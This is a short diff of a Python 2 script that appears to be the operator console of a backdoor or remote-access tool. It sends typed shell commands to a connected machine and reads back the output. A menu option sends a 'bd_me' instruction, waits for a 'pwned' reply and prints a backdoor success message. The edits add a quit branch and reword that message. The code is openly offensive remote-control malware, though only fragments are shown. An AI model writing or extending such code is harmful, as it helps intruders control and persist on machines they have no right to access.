@@ -64,7 +64,9 @@ def command():
             conn.send(cmd)
         except:
             print "[-] Cannot send user input."
-        if cd == "cd":
+        if cmd == "quit":
+            main()
+        elif cd == "cd":
             continue
         else:
             data = conn.recv(4096)
@@ -152,7 +154,7 @@ def main():
                 conn.send("bd_me")
                 pwned = conn.recv(1024)
                 if pwned == "pwned":
-                    print "Backdoor Successful."
+                    print "Backdoored."
             except:
                 print "Didn't work"
         elif choice == "6":
